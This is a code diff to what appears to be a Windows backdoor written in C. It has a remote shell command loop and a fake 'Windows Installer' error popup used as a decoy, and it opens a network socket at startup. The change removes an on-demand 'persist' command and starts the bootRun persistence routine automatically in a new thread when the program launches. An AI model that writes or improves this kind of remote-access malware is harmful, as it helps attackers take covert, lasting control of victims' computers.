@@ -9,6 +9,8 @@
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <pthread.h>
+
 
 #define bzero(p, size) (void) memset((p), 0, (size))
 
@@ -101,9 +103,6 @@ void Shell() {
 		else if (strncmp("cd ", buffer, 3) == 0) {
 			chdir(str_cut(buffer,3,100));
 		}
-		else if (strncmp("persist", buffer, 7) == 0) {
-			bootRun();
-		}
 		else if (strncmp("alert", buffer, 5) == 0){
             MessageBox(NULL, TEXT(str_cut(buffer,5,1024)), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
         }
@@ -140,6 +139,9 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
 		exit(1);
 	}
+
+	pthread_t thread_id;
+	pthread_create(&thread_id, NULL, bootRun, NULL);
 
 	sock = socket(AF_INET, SOCK_STREAM, 0);
 
